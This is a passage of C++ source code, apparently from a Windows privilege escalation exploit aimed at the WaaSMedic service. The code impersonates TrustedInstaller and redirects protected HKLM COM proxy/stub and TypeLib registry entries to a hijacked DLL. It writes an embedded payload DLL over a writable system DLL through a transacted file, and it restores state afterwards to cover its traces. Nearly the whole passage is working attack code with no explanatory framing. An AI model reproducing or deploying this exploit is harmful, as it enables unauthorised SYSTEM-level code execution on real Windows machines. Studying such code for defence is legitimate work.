        EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetTypeLibRegValuePath(), NULL, this->GetTypeLibOrigPath()));

        this->_StateRegTypeLibModified = FALSE;
    }
    
    bResult = TRUE;

cleanup:
    if (bImpersonated) this->RevertToSelf();

    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to restore TypeLib path in registry: %ws", this->GetTypeLibRegValuePath());

    return bResult;
}

BOOL Exploit::FindWaaSMedicCapsulePath()
{
    //
    // Path on Windows 10: c:\windows\System32\WaaSMedicCapsule.dll
    // Path on Windows 11: c:\windows\UUS\amd64\WaaSMedicCapsule.dll
    //

    BOOL bResult = FALSE;
    LPWSTR pwszModulePath = NULL;

    EXIT_ON_ERROR(!(pwszModulePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetSystemDirectoryW(pwszModulePath, MAX_PATH));
    swprintf_s(pwszModulePath, MAX_PATH, L"%ws\\%ws", pwszModulePath, STR_WAASMEDIC_CAPSULE);

    if ((GetFileAttributesW(pwszModulePath) == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND))
    {
        EXIT_ON_ERROR(!GetWindowsDirectoryW(pwszModulePath, MAX_PATH));
        swprintf_s(pwszModulePath, MAX_PATH, L"%ws\\UUS\\amd64\\%ws", pwszModulePath, STR_WAASMEDIC_CAPSULE);

        if ((GetFileAttributesW(pwszModulePath) == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND))
        {
            ERROR(L"Failed to determine file path for file: %ws", STR_WAASMEDIC_CAPSULE);
            goto cleanup;
        }
    }

    swprintf_s(this->_WaaSMedicCapsulePath, MAX_PATH, L"%ws", pwszModulePath);
    bResult = TRUE;

cleanup:
    Utils::SafeFree((PVOID*)&pwszModulePath);

    return bResult;
}

BOOL Exploit::FindProxyStubRegistryValuePath()
{
    BOOL bResult = FALSE;
    LPWSTR pwszRegPath = NULL, pwszProxyStubClsid = NULL;
    RPC_WSTR InterfaceGuidStr = NULL;
    UUID InterfaceGuid;

    //
    // HKLM\SOFTWARE\Classes\Interface\{839D7762-5121-4009-9234-4F0D19394F04}\ProxyStubClsid32
    //      (Default) -> {9C86F320-DEE3-4DD1-B972-A303F26B061E}
    // HKLM\SOFTWARE\Classes\CLSID\{9C86F320-DEE3-4DD1-B972-A303F26B061E}\InprocServer32
    //      (Default) -> C:\Windows\System32\TaskSchdPS.dll
    //

    InterfaceGuid = IID_TASKHANDLER;

    EXIT_ON_ERROR(!(pwszRegPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(UuidToStringW(&InterfaceGuid, &InterfaceGuidStr) != RPC_S_OK);

    swprintf_s(pwszRegPath, MAX_PATH, L"SOFTWARE\\Classes\\Interface\\{%ws}\\ProxyStubClsid32", (LPWSTR)InterfaceGuidStr);

    EXIT_ON_ERROR(!Utils::GetRegistryStringValue(HKEY_LOCAL_MACHINE, pwszRegPath, NULL, &pwszProxyStubClsid));

    swprintf_s(this->_ProxyStubRegValuePath, MAX_PATH, L"SOFTWARE\\Classes\\CLSID\\%ws\\InprocServer32", pwszProxyStubClsid);

    bResult = TRUE;

cleanup:
    if (InterfaceGuidStr) RpcStringFreeW(&InterfaceGuidStr);
    Utils::SafeFree((PVOID*)&pwszProxyStubClsid);
    Utils::SafeFree((PVOID*)&pwszRegPath);

    DEBUG(L"Path: %ws | Result: %d", this->_ProxyStubRegValuePath, bResult);

    return bResult;
}

BOOL Exploit::ModifyProxyStubRegistryValue()
{
    BOOL bResult = FALSE;
    BOOL bImpersonated = FALSE;

    EXIT_ON_ERROR(!this->GetProxyStubOrigPath()); // Make sure we retrieve the original path before modifying it
    EXIT_ON_ERROR(!this->ImpersonateTrustedInstaller());

    bImpersonated = TRUE;

    EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetProxyStubRegValuePath(), NULL, this->GetHijackedDllName()));

    this->_StateRegProxyStubModified = TRUE;
    bResult = TRUE;

cleanup:
    if (bImpersonated) this->RevertToSelf();

    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to write Proxy/Stub DLL to registry: %ws", this->GetProxyStubRegValuePath());

    return bResult;
}

BOOL Exploit::RestoreProxyStubRegistryValue()
{
    BOOL bResult = FALSE;
    BOOL bImpersonated = FALSE;

    if (this->_StateRegProxyStubModified)
    {
        EXIT_ON_ERROR(!this->ImpersonateTrustedInstaller());
        bImpersonated = TRUE;
        EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetProxyStubRegValuePath(), NULL, this->GetProxyStubOrigPath()));

        this->_StateRegProxyStubModified = FALSE;
    }

    bResult = TRUE;

cleanup:
    if (bImpersonated) this->RevertToSelf();

    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to restore Proxy/Stub DLL path in registry: %ws", this->GetProxyStubRegValuePath());

    return bResult;
}

BOOL Exploit::MapPayloadDll()
{
    BOOL bResult = FALSE;
    HANDLE hTransaction = NULL, hFileTransacted = NULL;
    LPVOID pDllData;
    DWORD dwDllSize = 0, dwBytesWritten = 0;
    UNICODE_STRING SectionName;
    OBJECT_ATTRIBUTES oa;
    NTSTATUS status = ERROR_SUCCESS;

    EXIT_ON_ERROR(!Utils::GetEmbeddedResource(IDR_RCDATA1, &pDllData, &dwDllSize));
    EXIT_ON_ERROR(!Utils::FindWritableSystemDll(dwDllSize, &this->_HollowedDllPath));

    ZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);

    EXIT_ON_ERROR(!NT_SUCCESS(status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL)));
    EXIT_ON_ERROR((hFileTransacted = CreateFileTransactedW(this->_HollowedDllPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL)) == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!WriteFile(hFileTransacted, pDllData, dwDllSize, &dwBytesWritten, NULL));
    
    RtlInitUnicodeString(&SectionName, this->GetHijackedDllSectionPath());
    InitializeObjectAttributes(&oa, &SectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    EXIT_ON_ERROR(!NT_SUCCESS(NtCreateSection(&this->_DllSectionHandle, SECTION_ALL_ACCESS, &oa, NULL, PAGE_READONLY, SEC_IMAGE, hFileTransacted)));

    bResult = TRUE;

cleanup:
    Utils::SafeCloseHandle(&hTransaction);
    Utils::SafeCloseHandle(&hFileTransacted);
    Utils::SetLastErrorFromNtStatus(status);

    DEBUG(L"Section: %ws (handle: 0x%04x) | Result: %d", this->GetHijackedDllSectionPath(), HandleToULong(this->_DllSectionHandle), bResult);

    if (!bResult)
        ERROR(L"Failed to create section: %ws", this->GetHijackedDllSectionPath());

    return bResult;
}

BOOL Exploit::UnmapPayloadDll()
{
    BOOL bResult = FALSE;

    Utils::SafeCloseHandle(&this->_DllSectionHandle);
    bResult = this->_DllSectionHandle == NULL;

    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Exploit::CreateDummyDllFile()
{
    BOOL bResult = FALSE;
    LPWSTR pwszFilePath = NULL;
    HANDLE hFile = NULL;
    
    EXIT_ON_ERROR(!(pwszFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetWindowsDirectoryW(pwszFilePath, MAX_PATH));
    EXIT_ON_ERROR(wcslen(pwszFilePath) < 2);

    pwszFilePath[2] = L'\0';
    swprintf_s(pwszFilePath, MAX_PATH, L"%ws\\%ws", pwszFilePath, this->GetHijackedDllName());

    //
    // Be careful here, the loader will try to open the file with Read+Delete share mode. So, we must
    // not request write access to the file, otherwise the call (on the target service side) will fail
    // with an ERROR_SHARING_VIOLATION error.
    //
    EXIT_ON_ERROR((hFile = CreateFileW(pwszFilePath, GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE);

    this->_DummyDllFileHandle = hFile;
    bResult = TRUE;

cleanup:
    if (!bResult) {
        ERROR(L"Failed to create dummy file: %ws", pwszFilePath);
        Utils::SafeCloseHandle(&hFile);
    }

    Utils::SafeFree((PVOID*)&pwszFilePath);

    return bResult;
}

BOOL Exploit::IsProxyStubDllLoaded()
{
    return WaitForSingleObject(this->_ProxyStubDllLoadEventHandle, 0) == WAIT_OBJECT_0;
}

BOOL Exploit::EnumerateTemporaryDirectories(std::vector<LPWSTR>* List)
{
    BOOL bResult = FALSE;
    WIN32_FIND_DATAW FindData;
    LPWSTR pwszSearchPattern = NULL, pwszCandidatePath;
    HANDLE hFind = NULL;

    // Make sure the result list is empty before populating it
    List->clear();

    EXIT_ON_ERROR(!Utils::GetWindowsTempDirectory(&pwszSearchPattern));

    swprintf_s(pwszSearchPattern, MAX_PATH, L"%ws\\%ws", pwszSearchPattern, L"_????????-????-????-????-????????????");

    if ((hFind = FindFirstFileW(pwszSearchPattern, &FindData)) == INVALID_HANDLE_VALUE)
    {
        if (GetLastError() == ERROR_FILE_NOT_FOUND)
            bResult = TRUE;

        goto cleanup;
    }

    do
    {
        if (pwszCandidatePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR)))
        {
            swprintf_s(pwszCandidatePath, MAX_PATH, L"%ws", FindData.cFileName);
            List->push_back(pwszCandidatePath);
        }
        
    } while (FindNextFileW(hFind, &FindData));

    bResult = TRUE;

cleanup:
    if (!bResult)
        ERROR(L"Failed to enumerate temp directory: %ws", pwszSearchPattern);

    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    Utils::SafeFree((PVOID*)&pwszSearchPattern);

    return bResult;
}

BOOL Exploit::DeleteTemporaryDirectories()
{
    BOOL bResult = TRUE, bExisted = FALSE;
    LPWSTR pwszDirectoryPath = NULL, pwszWindowsTempPath = NULL;;
    std::vector<LPWSTR> vDirectoriesToDelete;

    EXIT_ON_ERROR(!Utils::GetWindowsTempDirectory(&pwszWindowsTempPath));
    EXIT_ON_ERROR(!(pwszDirectoryPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));

    for (LPWSTR pwszPathAfter : _TemporaryDiretoriesAfter)
    {
        bExisted = FALSE;

        for (LPWSTR pwszPathBefore : _TemporaryDiretoriesBefore)
        {
            if (!wcscmp(pwszPathAfter, pwszPathBefore))
            {
                bExisted = TRUE;
                break;
            }
        }

        if (!bExisted)
            vDirectoriesToDelete.push_back(pwszPathAfter);
    }

    if (vDirectoriesToDelete.size() > 0)
    {
        INFO(L"Deleting %d temporary directories created by the service...", (DWORD)vDirectoriesToDelete.size());

        for (LPWSTR pwszEntry : vDirectoriesToDelete)
        {
            swprintf_s(pwszDirectoryPath, MAX_PATH, L"%ws\\%ws", pwszWindowsTempPath, pwszEntry);

            if (!Utils::DeleteDirectory(pwszDirectoryPath))
            {
                bResult = FALSE;
            }
        }
    }

cleanup:
    Utils::SafeFree((PVOID*)&pwszWindowsTempPath);
    Utils::SafeFree((PVOID*)&pwszDirectoryPath);

    return bResult;
}
